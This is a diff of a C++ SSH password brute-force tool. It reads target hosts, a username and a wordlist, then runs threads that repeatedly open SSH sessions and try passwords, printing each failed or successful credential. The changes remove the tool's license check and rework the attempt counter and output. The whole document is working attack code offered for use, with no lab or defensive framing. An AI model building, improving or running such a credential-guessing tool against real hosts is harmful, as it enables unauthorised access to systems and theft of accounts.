@@ -9,6 +9,7 @@
 #include <vector>
 #include <chrono>
 #include <cstring>
+
 //   /$$$$$$$  /$$$$$$$$ /$$      /$$       /$$$$$$       /$$   /$$  /$$$$$$  /$$$$$$$$        /$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$
 //  | $$__  $$|__  $$__/| $$  /$ | $$      |_  $$_/      | $$  | $$ /$$__  $$| $$_____/       /$$__  $$| $$__  $$ /$$__  $$| $$  | $$
 //  | $$  \ $$   | $$   | $$ /$$$| $$        | $$        | $$  | $$| $$  \__/| $$            | $$  \ $$| $$  \ $$| $$  \__/| $$  | $$
@@ -21,6 +22,7 @@
 
 
 #define LINNUX_COMMAND_ERR 128
+
 
 int main(int argc, char** argv)
 {
@@ -75,27 +77,16 @@ int main(int argc, char** argv)
         }else if(!strcmp(argv[i], "-a") || !strcmp(argv[i], "--attempts-per-session"))
         {
             attempts_per_conn = atoi(argv[++i]);
-        }else if(!strcmp(argv[i], "-l") || !strcmp(argv[i], "--license"))
-        {
-            f_license_arg = argv[++i];
         }
     }
 
-    if(!hosts.size() || user == nullptr || !wordlist.is_open() || !f_license_arg.size())
+    if(!hosts.size() || user == nullptr || !wordlist.is_open() )
     {
         std::cout << "USAGE: " << argv[0] << " + options \nOPTIONS: \n      -i/--host                    IP Address of one target\n      -iL/--hosts-file             File Containing targets\n      -u/--user                    Username\n      -w/--wordlist                Wordlist\n      -p/--port                    Port (Optional)\n      -th/--threads-per-host       Threads per host (Optional)\n      -a/--attempts-per-session    Password Attempts per SSH session" << std::endl;
         return LINNUX_COMMAND_ERR;
     }
 //Check if all args are passed from the command line
 
-    std::cout << "User ID: "  << std::endl;
-
-    gau8::license lic(f_license_arg.c_str());
-    lic.check_license();
-
-    std::cout << "Test_Done";
-
-    std::cin.get();
 
     for(uint16_t host_index = 0; host_index < hosts.size(); ++host_index)
     {
@@ -108,7 +99,7 @@ int main(int argc, char** argv)
                 char f_password[15];
                 while(true)
                 {
-                    //basically create a new ssh connection and session, try 3 passwords, then kill it
+                    //basically create a new ssh connection and session, try [attempts_per_conn] passwords, then kill it
                     int handle;
                     gau8::ssh* f_ssh = new gau8::ssh(host.c_str(), port, handle);
                     while(handle)
@@ -124,34 +115,29 @@ int main(int argc, char** argv)
                         {
                             //Lock the wordlist and read one password
                             wordlist >> f_password;
+                            //raise the counter for the number of attempts
+                            attempt_counter++;
                             m_lock_pass.unlock();
                         }
+    
                         //try to authenticate via the username that the connection was created with and the password that was read above
                         if(f_ssh->auth_user_pass(user, f_password))
-                        {
-                            //raise the counter for the number of attempts
-                            if(m_lock_pass.try_lock())
-                            {
-                                attempt_counter++;
-                                m_lock_pass.unlock();
-                            }
+                        {                
                             //print the successful attempt
-                            std::cout << "ATTEMPT " << attempt_counter << " - Auth successful for user " << user << ":" << f_password << std::endl;
+                            std::cout << "ATTEMPT " << attempt_counter << " - Auth successful for user " << user << ":" << f_password;
+                            std::cout << "\r";
                         }else
                         {
-                            if(m_lock_pass.try_lock())
-                            {
-                                attempt_counter++;
-                                m_lock_pass.unlock();
-                            }
                             //print the unsuccessful attempt
-                            std::cout << "ATTEMPT " << attempt_counter << " - Auth failed for user " << user << ":" << f_password << std::endl;
+                            std::cout << "ATTEMPT " << attempt_counter << " - Auth failed for user " << user << ":" << f_password;
+                            std::cout << "\r";
+
                         }
                     }
                     delete f_ssh;
                 }
             }));
-            std::cout << " - DONE" << std::endl;
+            std::cout << " - DONE                                                     \r";
         }
     }
     std::cin.get();
